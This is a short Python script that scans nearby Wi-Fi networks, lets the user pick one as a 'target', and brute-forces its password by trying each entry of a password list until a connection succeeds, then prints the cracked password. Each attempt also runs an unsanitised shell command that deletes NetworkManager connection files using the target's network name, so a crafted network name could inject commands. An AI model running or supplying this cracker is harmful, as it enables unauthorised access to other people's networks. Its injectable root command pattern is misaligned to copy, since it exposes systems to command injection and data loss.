#!/usr/bin/env python3
'''
Created on 13.10.2016

@author: Brom
@e-mail: wasalev@mail.ru
'''

import net_wrap
import os
interfacesList=net_wrap.interfacesList()
print('Choose interface:\n')
for inter in interfacesList:
	print("["+str(interfacesList.index(inter))+"] "+inter)
curIntIndex=int(input(">>> "))
curInt=interfacesList[curIntIndex]
targetsList=net_wrap.wifiList(curInt)
print('Choose target: ')
for cell in targetsList:
	print("["+str(targetsList.index(cell))+"] "+cell['Address']+" | "+cell['ESSID']+" | Encryption key: "+cell['Encryption key']  +"\n")
targetIndex=int(input(">>> "))
target=targetsList[targetIndex]
with open("passwords.txt") as infile:
    for idx, password in enumerate(infile):
    	if(os.path.isdir('/etc/NetworkManager/system-connections/')):
    		os.system('rm -f /etc/NetworkManager/system-connections/'+target['ESSID']+"*")
    	print("\rTry[#{}]\t{}".format(idx, password), end='')
    	res=net_wrap.tryConnect(target['ESSID'], password, curInt)
    	if res==True:
    		print("="*20)
    		print(password)
    		exit()
	
